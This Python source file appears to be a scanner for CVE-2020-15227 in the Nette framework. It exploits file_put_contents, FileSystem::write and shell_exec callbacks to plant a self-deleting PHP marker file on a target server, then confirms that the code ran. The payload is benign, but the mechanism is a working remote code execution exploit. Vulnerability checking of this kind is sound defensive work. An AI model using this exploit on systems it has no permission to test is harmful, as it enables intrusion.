import uuid
import hashlib
from urllib import request, parse
from urllib.error import HTTPError


class CVE_2020_15227:
    BASENAME = 'cve_2020_15227_'

    def __init__(self, verbose=True):
        self.checksum = None
        self.verbose = verbose
        self.__generate_checksum()

    def send_request(self, url):
        try:
            with request.urlopen(url) as response:
                return {
                    'code': response.getcode(),
                    'response': response.read().decode('utf-8')
                }
        except HTTPError as e:
            return {
                'code': e.getcode(),
                'response': e.read().decode('utf-8')
            }

    def run_vulnerability(self, url, params):
        request_url = url.rstrip('/') + '/nette.micro/default?' + parse.urlencode(params)
        return self.send_request(request_url)

    def run_vulnerability_check(self, url, params):
        request_url = url.rstrip('/') + '/' + params['_filename']

        try:
            with request.urlopen(url=request_url) as response:
                result = {
                    'code': response.getcode(),
                    'response': response.read().decode('utf-8')
                }

                if self.checksum in result['response']:
                    result['confirmed'] = True
                else:
                    result['confirmed'] = False

                return result
        except HTTPError as e:
            return {
                'code': e.getcode(),
                'response': e.read().decode('utf-8'),
                'confirmed': False
            }

    def test_url(self, url):
        vulnerability_dictionary = self.get_vulnerability_dictionary()

        self.__verbose('Run vulnerability scan')

        list_vulnerabilities = list()

        for vulnerability in vulnerability_dictionary:
            prepare_dictionary = self.__prepare_dictionary(vulnerability)

            self.__verbose('Run vulnerability \'\033[33m' + vulnerability['callback'] + '\033[0m\'')
            result = self.run_vulnerability(url, prepare_dictionary)

            self.__verbose('Response HTTP code: ' + str(result['code']))

            self.__verbose('Vulnerability check')
            result_check = self.run_vulnerability_check(url, vulnerability)

            if result_check['confirmed'] is True:
                list_vulnerabilities.append(vulnerability['callback'])

            self.__verbose('Response HTTP code: \033[34m' + str(result_check['code']) + '\033[0m')

            if result_check['confirmed'] is True:
                self.__verbose('Confirmed vulnerability: \033[4m' + str(result_check['confirmed']) + '\033[0m')
            else:
                self.__verbose('Confirmed vulnerability: \033[31m' + str(result_check['confirmed']) + '\033[0m')

        if len(list_vulnerabilities) > 0:
            self.__verbose('\033[91m!! Confirmed vulnerability !!\033[0m')
            for vulnerability in list_vulnerabilities:
                self.__verbose('\033[93m* ' + vulnerability + '\033[0m')

            self.__verbose('\033[91mThe web address can be attacked! Update composer.json immediately!\033[0m')

        else:
            self.__verbose('\033[92mThe web address is secured against attack! Congratulations.\033[0m')

        return len(list_vulnerabilities) > 0

    def run(self, url, regenerate_checksum=False):
        # Regenerate checksum
        if regenerate_checksum is True:
            self.__verbose('Regenerate checksum: ', end='')
            self.__generate_checksum()
            self.__verbose(self.checksum)

        else:
            self.__verbose('Checksum: ' + self.checksum)

        # Test URL
        return self.test_url(url=url)

    """
    Parameter _filename is the name of the file and the request is ignored.
    :return List of vulnerabilities
    """

    def get_vulnerability_dictionary(self):
        return [
            # Vulnerabilities are trying to exploit the library Nette\Utils\FileSystem
            {
                'callback': 'Nette\\Utils\\FileSystem::write',
                'file': (self.BASENAME + self.checksum) + '_nette_utils.php',
                'content': self.__generate_code((self.BASENAME + self.checksum) + '_nette_utils.php'),
                '_filename': (self.BASENAME + self.checksum) + '_nette_utils.php',
            },

            # Vulnerabilities are trying to exploit the file_put_contents(...) function
            {
                'callback': 'file_put_contents',
                'filename': (self.BASENAME + self.checksum) + '_php_fpc.php',
                'data': self.__generate_code((self.BASENAME + self.checksum) + '_php_fpc.php'),
                '_filename': (self.BASENAME + self.checksum) + '_php_fpc.php',
            },

            # Vulnerabilities are trying to exploit the shell_exec(...) function
            {
                'callback': 'shell_exec',
                'cmd': 'echo "' + (
                    self.__generate_code((self.BASENAME + self.checksum) + '_php_shell.php')) + '" > ' + (
                               self.BASENAME + self.checksum) + '_php_shell.php',
                '_filename': (self.BASENAME + self.checksum) + '_php_shell.php',
            }
        ]

    def __generate_checksum(self):
        guid = uuid.uuid4()
        md5 = hashlib.md5(str(guid).encode('utf-8'))
        self.checksum = md5.hexdigest()

    def __prepare_dictionary(self, dictionary):
        result = {}

        for key in dictionary:
            if '_' not in key[0]:
                result[key] = dictionary[key]

        return result

    def __verbose(self, input, end='\n'):
        if self.verbose is True:
            print('[CVE-2020-15227] ' + input, end=end)

    def __generate_code(self, filename):
        return "<?php echo '" + self.checksum + "'; @unlink('" + filename + "');"
